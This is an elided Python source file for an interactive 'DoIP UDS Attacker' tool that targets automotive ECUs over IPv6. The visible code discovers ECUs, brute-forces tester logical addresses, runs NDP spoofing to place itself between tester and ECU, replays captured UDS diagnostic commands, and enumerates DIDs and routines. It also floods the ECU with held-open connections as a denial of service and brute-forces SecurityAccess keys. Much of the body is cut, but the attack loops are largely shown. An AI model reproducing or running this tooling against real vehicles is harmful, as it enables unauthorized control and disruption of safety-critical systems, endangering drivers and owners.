...
# === NEW: Color Definitions (ANSI Escape Codes) ===
class Colors:
    # Foreground Colors
    R = '\033[31m'  # Red (errors, warnings)
    G = '\033[32m'  # Green (success)
    Y = '\033[33m'  # Yellow (actions, prompts)
    B = '\033[34m'  # Blue (info, logs)
    M = '\033[35m'  # Magenta (responses)
    C = '\033[36m'  # Cyan (details, headers)
    W = '\033[37m'  # White (neutral)
...
class DoIPAttacker:
    ...
    def load_existing(self):
        ...
        if os.path.exists(PCAP_FILE):
            try:
                ...
                print(f"{Colors.Y}[+] Loaded {len(existing)} packets → {len(self.all_packets)} unique{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.R}[-] Could not read pcap: {e}{Colors.RESET}")
        ...
        if payload_type == 0x8001 and len(raw_load) >= 12:
            ...
            if len(raw_load) > 12:
                ...
                if sid == 0x3E: # TesterPresent
                    uds_hex = Colors.G + uds_hex + Colors.RESET
                elif sid == 0x27: # SecurityAccess
                    uds_hex = Colors.Y + uds_hex + Colors.RESET
                elif sid == 0x22: # ReadDataByIdentifier
                    uds_hex = Colors.C + uds_hex + Colors.RESET
                elif sid == 0x31: # RoutineControl
                    uds_hex = Colors.M + uds_hex + Colors.RESET
                elif sid >= 0x40: # Positive responses typically SID+0x40
                    uds_hex = Colors.G + uds_hex + Colors.RESET
        arrow = "→"
        print(f"{Colors.C}[{proto}]{Colors.RESET} {src}:{sport} {arrow} {dst}:{dport} | DoIP {doip_type_str} {details}")
        if uds_hex:
            print(f" UDS → {uds_hex}")
    ...
    def ndp_spoof_thread(self, spoof_target: str, victim_ip: str, victim_mac: str):
        ...
        """
        print(f"{Colors.Y}[SPOOF] Poisoning {victim_ip} → {spoof_target} is at {ATTACKER_MAC}{Colors.RESET}")
    ...
    def impersonate_and_sniff(self):
        ...
        if not self.target_ip:
            print(f"{Colors.R}[-] Discover ECU first (run 'd'){Colors.RESET}")
            return
        ...
        if tester_mac == "ff:ff:ff:ff:ff:ff" or ecu_mac == "ff:ff:ff:ff:ff:ff":
            print(f"{Colors.R}[-] Failed to resolve MACs. Check connectivity or run get_mac_ipv6 manually.{Colors.RESET}")
            return
        # Duration controls sniff timeout and spoofing thread lifetime
        duration = int(input(f"{Colors.C}Duration (seconds, default 30) → {Colors.RESET}") or "30")
        print(f"\n{Colors.G}[+] Starting bidirectional NDP MitM for {duration}s...{Colors.RESET}")
        ...
        t1.join(timeout=3)
        t2.join(timeout=3)
        print(f"\n{Colors.G}[+] MitM stopped. {len(self.all_packets)} unique packets captured.{Colors.RESET}")
        wrpcap(PCAP_FILE, self.all_packets)
        print(f"{Colors.G} Saved → {os.path.abspath(PCAP_FILE)}{Colors.RESET}")
    ...
    def list_mode(self):
        ...
        if not os.path.exists(PCAP_FILE):
            print(f"{Colors.R}[-] No capture file yet — run 'sniff' first{Colors.RESET}")
            return
        pkts = rdpcap(PCAP_FILE)
        print(f"\n{Colors.C}{Colors.BOLD}=== CAPTURED DoIP/UDS PACKETS: {len(pkts)} ==={Colors.RESET}")
        ...
        for i, p in enumerate(pkts):
            ...
            print(f"{color}{i:4d}{Colors.RESET} {proto:<5} {src:<36} → {dst:<36} {doip_type:<12} {uds_hex or 'N/A'}")
        print("─" * 140)
    ...
    def replay_mode(self):
        ...
        if not self.tcp_socket:
            print(f"{Colors.R}[-] Must be connected first (run 's' to connect with stolen LA).{Colors.RESET}")
            return
        if not os.path.exists(PCAP_FILE):
            print(f"{Colors.R}[-] No capture file.{Colors.RESET}")
            return
        pkts = rdpcap(PCAP_FILE)
        self.list_mode()
        # User chooses which captured packet indices to replay
        choice = input(f"\n{Colors.Y}Packets to replay (e.g. 5 or 3-10 or 1,4,7) → {Colors.RESET}").strip()
        indices = []
        ...
        if not to_send:
            print(f"{Colors.R}[-] No valid packets selected.{Colors.RESET}")
            return
        ...
        for pkt in to_send:
            ...
            if len(raw_load) >= 12 and raw_load[0:2] == b'\x02\xfd' and raw_load[2:4] == b'\x80\x01':
                ...
                if uds_data:
                    ...
                    print(f"{Colors.C}[EXTRACTED UDS] {uds_data.hex().upper()}{Colors.RESET}")
        if not uds_commands:
            print(f"{Colors.R}[-] No valid UDS payloads found.{Colors.RESET}")
            return
        # Number of times to repeat the selected sequence
        times = int(input(f"{Colors.C}Spam times (default 1) → {Colors.RESET}") or "1")
        print(f"\n{Colors.G}[REPLAY via TCP] Sending {len(uds_commands)} UDS command(s) × {times}...{Colors.RESET}")
        # Replay loop:
        # - Use send_uds() so DoIP headers use current stolen_la / ecu_la
        for _ in range(times):
            for uds in uds_commands:
                print(f"{Colors.Y}[SENDING] {uds.hex().upper()}{Colors.RESET}")
                resp = self.send_uds(uds)
                if resp:
                    print(f"{Colors.M}[RESPONSE] {resp.hex().upper()}{Colors.RESET}")
                time.sleep(0.5)
        print(f"{Colors.G}[+] REPLAY COMPLETE (via valid TCP session){Colors.RESET}")
    ...
    def do_discovery(self):
        ...
        sock.bind((MY_IP6, 0))
        sock.settimeout(3.0)
        print(f"\n{Colors.C}[d] Performing UDP Vehicle Discovery (IPv6)...{Colors.RESET}")
        ...
        try:
            ...
            if p_type != TYPE_VEHICLE_ID_RES:
                print(f"{Colors.R}[-] Unexpected response type: 0x{p_type:04X}{Colors.RESET}")
                return
            # Parse announcement payload (VIN, logical address, entity IDs, etc.)
            entity = parse_vehicle_announcement(payload)
            if not entity:
                print(f"{Colors.R}[-] Failed to parse announcement.{Colors.RESET}")
                return
    ...
    def enumerate_la(self):
        ...
        """
        if not self.target_ip:
            print(f"{Colors.R}[-] Discover ECU first with 'd'{Colors.RESET}")
            return
        print(f"\n{Colors.C}=== Enumerating Tester Logical Addresses ==={Colors.RESET}")
        found = False
        for la in range(0x0E00, 0x0F00):
            print(f"{Colors.Y}Trying LA 0x{la:04X}...{Colors.RESET}", end=" ")
            ...
            try:
                ...
                code = body[4]
                if code == 0x10:
                    print(f"\n{Colors.G}[SUCCESS] Valid LA found: 0x{la:04X}{Colors.RESET}")
                    self.stolen_la = la
                    found = True
                    break
                else:
                    print(f"{Colors.R}Rejected (0x{code:02X}){Colors.RESET}")
            except Exception:
                print(f"{Colors.R}Failed{Colors.RESET}")
            finally:
                sock.close()
            time.sleep(0.05)
        if not found:
            print(f"\n{Colors.R}[-] No valid LA found.{Colors.RESET}")
    ...
    def do_connect(self):
        ...
        if self.stolen_la is None:
            print(f"{Colors.R}[-] No stolen LA. Run 'l' to enumerate first.{Colors.RESET}")
            return
        if not self.target_ip:
            print(f"{Colors.R}[-] No ECU discovered (run 'd' first).{Colors.RESET}")
            return
        if self.tcp_socket:
            print(f"{Colors.Y}[!] Already connected (run 't' first).{Colors.RESET}")
            return
        print(f"\n{Colors.Y}[s] Connecting TCP to {self.target_ip}:{DOIP_PORT} (IPv6)...{Colors.RESET}")
        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        sock.bind((MY_IP6, 0))
        try:
            sock.connect((self.target_ip, DOIP_PORT))
        except Exception as e:
            print(f"{Colors.R}[-] Connection failed: {e}{Colors.RESET}")
            return
        print(f"{Colors.Y}[s] Sending Routing Activation with stolen LA...{Colors.RESET}")
        ...
        try:
            ...
            code = body[4]
            if code == 0x10:
                print(f"{Colors.G}[+] Routing Activation SUCCESS{Colors.RESET}")
                sock.setblocking(0) # non-blocking mode for main loop responsiveness
                self.tcp_socket = sock
            else:
                print(f"{Colors.R}[-] Activation failed (0x{code:02X}){Colors.RESET}")
                sock.close()
        except Exception as e:
            print(f"{Colors.R}[-] Activation error: {e}{Colors.RESET}")
            sock.close()

    def send_uds(self, uds_bytes: bytes):
        """
        Sends a raw UDS payload over the active DoIP TCP session and waits for a response.
        Handles modern DoIP behavior: UDS responses are carried in TYPE_DIAGNOSTIC_MESSAGE (0x8001),
        not in TYPE_DIAGNOSTIC_POS_ACK (0x8002).
        Skips any pending non-diagnostic messages before reading the actual response.
        """
        if not self.tcp_socket or self.ecu_la is None:
            print(f"{Colors.R}[-] Not connected or no ECU LA.{Colors.RESET}")
            return None
        # Build DoIP diagnostic message: SA (stolen LA) + TA (ECU LA) + UDS bytes
        ...
        try:
            ...
            print(f"{Colors.R}[-] Send error: {e}{Colors.RESET}")
            return None
        # Switch to blocking mode to reliably read response
        self.tcp_socket.setblocking(1)
        self.tcp_socket.settimeout(2.0)
        try:
            # Read first DoIP header
            header = self.tcp_socket.recv(8)
            if len(header) < 8:
                print(f"{Colors.R}[-] Incomplete DoIP header received{Colors.RESET}")
                return None
            p_type, p_len, _ = parse_header(header)
            # Skip any non-diagnostic messages (e.g. TesterPresent responses, acks)
            while p_type != TYPE_DIAGNOSTIC_MESSAGE:
                # Consume the payload of the unwanted message
                if p_len > 0:
                    remaining = p_len
                    while remaining > 0:
                        chunk = self.tcp_socket.recv(min(remaining, 4096))
                        if not chunk:
                            print(f"{Colors.R}[-] Connection closed while skipping message{Colors.RESET}")
                            return None
                        remaining -= len(chunk)
                # Read next header
                header = self.tcp_socket.recv(8)
                if len(header) < 8:
                    print(f"{Colors.R}[-] Incomplete header while skipping messages{Colors.RESET}")
                    return None
                p_type, p_len, _ = parse_header(header)
            # Now read the actual diagnostic response payload
            payload_data = b''
            remaining = p_len
            while remaining > 0:
                chunk = self.tcp_socket.recv(min(remaining, 4096))
                if not chunk:
                    print(f"{Colors.R}[-] Connection closed during payload read{Colors.RESET}")
                    return None
                payload_data += chunk
                remaining -= len(chunk)
            # Extract UDS response: skip Source Address (2 bytes) + Target Address (2 bytes)
            if len(payload_data) >= 4:
                sa, ta = struct.unpack('!HH', payload_data[:4])
                uds_resp = payload_data[4:]
                print(f"{Colors.M}Response: {uds_resp.hex().upper()}{Colors.RESET}")
                return uds_resp
            else:
                print(f"{Colors.R}[-] Malformed diagnostic payload (too short){Colors.RESET}")
                return None
        except socket.timeout:
            print(f"{Colors.R}Response: TIMEOUT{Colors.RESET}")
            return None
        except Exception as e:
            print(f"{Colors.R}[-] Receive error: {e}{Colors.RESET}")
            return None
        finally:
            # Restore non-blocking mode for the interactive loop
    ...
    def do_disconnect(self):
        ...
        """
        if not self.tcp_socket:
            print(f"{Colors.Y}[!] No active connection.{Colors.RESET}")
            return
        print(f"\n{Colors.Y}[t] Closing TCP connection...{Colors.RESET}")
        try:
        ...
        print(f"{Colors.G}[+] Disconnected.{Colors.RESET}")
    ...
    def did_enumeration(self):
        ...
        """
        if not self.tcp_socket:
            print(f"{Colors.R}[-] Not connected. Run 's' first.{Colors.RESET}")
            return
        print(f"\n{Colors.C}[*] Starting DID Enumeration (0x22 F100-F1FF)...{Colors.RESET}")
        self.dids_list = []
        for did in range(0xF100, 0xF200):
            ...
            if len(resp) >= 3 and resp[0] == 0x62 and resp[1:3] == struct.pack('!H', did):
                data = resp[3:]
                print(f"{Colors.G}[+] DID 0x{did:04X} → SUPPORTED | {data.hex().upper()}{Colors.RESET}")
                self.dids_list.append((did, "supported"))
            elif len(resp) >= 3 and resp[:3] == b'\x7F\x22\x33':
                print(f"{Colors.Y}[?] DID 0x{did:04X} → SECURITY REQUIRED (7F 22 33){Colors.RESET}")
                self.dids_list.append((did, "security_required"))
            elif len(resp) >= 3 and resp[:2] == b'\x7F\x22':
                nrc = resp[2]
                print(f"{Colors.R}[-] DID 0x{did:04X} → NEGATIVE (7F 22 {nrc:02X}){Colors.RESET}")
            time.sleep(0.01)
        if self.dids_list:
            print(f"\n{Colors.C}List:{Colors.RESET}")
            for did, status in self.dids_list:
                status_text = f"{Colors.G}READABLE{Colors.RESET}" if status == "supported" else f"{Colors.Y}SEC REQ{Colors.RESET}"
    ...
    def rid_enumeration(self):
        ...
        if not self.tcp_socket:
            print(f"{Colors.R}[-] Not connected. Run 's' first.{Colors.RESET}")
            return
        print(f"\n{Colors.C}[*] Starting RID Enumeration (0x31 01 1200-13FF)...{Colors.RESET}")
        self.rids_list = []
        for rid in range(0x1200, 0x1400):
            ...
            if len(resp) >= 4 and resp[:4] == b'\x71\x01' + struct.pack('!H', rid):
                ...
                print(f"{Colors.G}[+] RID 0x{rid:04X} → STARTABLE | {result.hex().upper()}{Colors.RESET}")
                self.rids_list.append((rid, "startable"))
            elif len(resp) >= 3 and resp[:3] == b'\x7F\x31\x33':
                print(f"{Colors.Y}[?] RID 0x{rid:04X} → SECURITY REQUIRED (7F 31 33){Colors.RESET}")
        ...
        if self.rids_list:
            ...
            for rid, status in self.rids_list:
                status_text = f"{Colors.G}STARTABLE{Colors.RESET}" if status == "startable" else f"{Colors.Y}SEC REQ{Colors.RESET}"
    ...
    def pid_enumeration(self):
        ...
        if not self.tcp_socket:
            print(f"{Colors.R}[-] Not connected. Run 's' first.{Colors.RESET}")
            return
        print(f"\n{Colors.C}[*] Starting PID Enumeration (Mode 01 00-FF)...{Colors.RESET}")
        self.pids_list = []
        for pid in range(0x00, 0x100):
            ...
            if resp[:2] == b'\x41':
                data = resp[1:]
                print(f"{Colors.G}[+] PID 0x{pid:02X} → SUPPORTED | {data.hex().upper()}{Colors.RESET}")
                self.pids_list.append(pid)
            time.sleep(0.01)
        print(f"\n{Colors.G}[+] PID Enumeration complete. Found {len(self.pids_list)} supported PIDs:{Colors.RESET}")
    ...
    def dos_attack(self, duration=15, max_threads=200):
        ...
        """
        if not self.target_ip:
            print(f"{Colors.R}[-] No ECU IP discovered.{Colors.RESET}")
            return
        print(f"\n{Colors.R}[!] Starting PERSISTENT DoS ({max_threads} threads, {duration}s)...{Colors.RESET}")
        print(f"{Colors.Y} Connections held open after activation → exhausts ECU resources{Colors.RESET}\n")
        def hold_connection():
            s = None
            try:
                ...
                print(f"{Colors.G} [+] Thread held connection open{Colors.RESET}")
        ...
        for i in range(max_threads):
            ...
            threads.append(t)
            time.sleep(0.02)
        print(f"{Colors.Y} Launched {len(threads)} persistent connections{Colors.RESET}")
        time.sleep(duration)
        print(f"\n{Colors.R}[!] DoS complete. Legitimate tester should have been blocked.{Colors.RESET}")
    ...
    def brute_force_attack(self):
        ...
        KEY_MAX = 0x11222FFF
        KEY_LENGTH = 4
        print(f"{Colors.Y}[BRUTE] Requesting seed (27 01)...{Colors.RESET}")
        seed_resp = self.send_uds(bytes([0x27, 0x01]))
        if seed_resp is None:
            print(f"{Colors.R}[BRUTE] No response to seed request.{Colors.RESET}")
            return
        print(f"{Colors.Y}[BRUTE] Seed response: {seed_resp.hex().upper()}{Colors.RESET}")
        if not (len(seed_resp) >= 3 and seed_resp[0] == 0x67 and seed_resp[1] == 0x01):
            print(f"{Colors.R}[BRUTE] Unexpected or negative seed response.{Colors.RESET}")
            return
        ...
        if actual_key_len != KEY_LENGTH:
            print(f"{Colors.Y}[BRUTE] Warning: Seed length {actual_key_len} bytes – adjusting key length.{Colors.RESET}")
            KEY_LENGTH = actual_key_len
        print(f"{Colors.Y}[BRUTE] Seed: {seed_bytes.hex().upper()} (length={KEY_LENGTH} bytes){Colors.RESET}")
        print(f"{Colors.Y}[BRUTE] Starting brute force from 0x{KEY_MIN:08X} to 0x{KEY_MAX:08X}{Colors.RESET}")
        attempts = 0
        ...
        for k in range(KEY_MIN, KEY_MAX + 1):
            ...
            if attempts % 50 == 0:
                ...
                print(f"{Colors.Y}[BRUTE] Attempts: {attempts} | Last key: 0x{k:08X} | Rate: {attempts / elapsed:.1f} att/s{Colors.RESET}", end="\r")
            if resp is None:
                continue
            # Success condition: 67 02
            if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x02:
                print(f"\n{Colors.G}[BRUTE] SUCCESS!{Colors.RESET}")
                print(f"{Colors.G}[BRUTE] Valid key found after {attempts} attempts{Colors.RESET}")
                print(f"{Colors.G}[BRUTE] Key (int): 0x{k:0{KEY_LENGTH * 2}X}{Colors.RESET}")
                print(f"{Colors.G}[BRUTE] Key (bytes): {key_bytes.hex().upper()}{Colors.RESET}")
                print(f"{Colors.G}[BRUTE] ECU response: {resp.hex().upper()}{Colors.RESET}")
                return
            # Lockout condition in protected mode: 7F 27 33
            if len(resp) >= 3 and resp[0] == 0x7F and resp[1] == 0x27 and resp[2] == 0x33:
                print(f"\n{Colors.R}[BRUTE] ECU entered lockout mode (7F 27 33). Stopping attack.{Colors.RESET}")
                return
            time.sleep(0.002)
        print(f"\n{Colors.R}[BRUTE] Exhausted key range. No valid key found.{Colors.RESET}")
    ...
    def print_doip_status(self):
        ...
        """
        print(f"\n{Colors.C}{Colors.BOLD}=== DoIP Attacker (IPv6) ==={Colors.RESET}")
        print(f"{Colors.W}Stolen LA : {'0x{:04X}'.format(self.stolen_la) if self.stolen_la else 'None (run l)'}{Colors.RESET}")
        print(f"{Colors.W}ECU IP : {self.target_ip or 'Not discovered (run d)'}{Colors.RESET}")
        print(f"{Colors.W}ECU LA : {'0x{:04X}'.format(self.ecu_la) if self.ecu_la else 'Unknown'}{Colors.RESET}")
        print(f"{Colors.W}TCP : {'CONNECTED' if self.tcp_socket else 'DISCONNECTED'}{Colors.RESET}")
        print(f"{Colors.W}Keep-alive: {'ON' if self.auto_keepalive else 'OFF'}{Colors.RESET}")
        print(f"{Colors.W}Captured packets: {len(self.all_packets)}{Colors.RESET}")
        print(f"\n{Colors.C}Commands:{Colors.RESET}")
        print(f"{Colors.B} d = discover ECU || s = connect || t = disconnect{Colors.RESET}")
        print(f"{Colors.B} l = enumerate LA || e/x = keep-alive on/off{Colors.RESET}")
        print(f"{Colors.B} ed = did enum || er = rid enum || ep = pid enum{Colors.RESET}")
        print(f"{Colors.B} dos = denial of service || b = brute force{Colors.RESET}")
        print(f"{Colors.B} sniff = impersonate + sniff (NDP) || list = show captured packets{Colors.RESET}")
        print(f"{Colors.B} replay = capture tester sequence and replay with attacker IP{Colors.RESET}")
        print(f"{Colors.B} q = back to main menu{Colors.RESET}")
        print(f"{Colors.B} <hex> = send UDS command{Colors.RESET}")
        print(f"{Colors.Y}>{Colors.RESET} ", end="", flush=True)
    ...
    async def run(self):
        ...
        """
        self.load_existing()
        print(f"{Colors.C}=== DoIP UDS Attacker with Sniffing (IPv6) ==={Colors.RESET}\n")
            ...
            if self.auto_keepalive and self.tcp_socket:
                ...
                if now - self.last_keepalive_sent >= KEEPALIVE_INTERVAL:
                    try:
                        ...
                        self.tcp_socket.sendall(create_header(TYPE_DIAGNOSTIC_MESSAGE, len(payload)) + payload)
                        print(f"\n{Colors.B}→ 3E 80 auto keep-alive ({now:.1f}s){Colors.RESET}")
                        self.last_keepalive_sent = now
                    except:
                        print(f"\n{Colors.R}[-] Failed to send keep-alive{Colors.RESET}")
            ...
            if select.select([sys.stdin], [], [], 0.05)[0]:
                ...
                if cmd in ("d", "l", "s", "t", "e", "x", "q", "ed", "er", "ep", "dos", "b", "sniff", "list", "replay"):
                    if cmd == "q":
                        ...
                        print(f"\n{Colors.G}[+] Auto keep-alive ENABLED{Colors.RESET}")
                    elif cmd == "x":
                        self.auto_keepalive = False
                        print(f"\n{Colors.G}[+] Auto keep-alive DISABLED{Colors.RESET}")
                    elif cmd == "ed":
                    ...
                    if len(cleaned) % 2 == 0 and all(c in "0123456789ABCDEF" for c in cleaned):
                        ...
                        print(f"\n{Colors.B}{' '.join(pairs)} → sent{Colors.RESET}")
                        self.send_uds(uds_bytes)
                    else:
                        print(f"\n{Colors.R}[-] Invalid hex{Colors.RESET}")
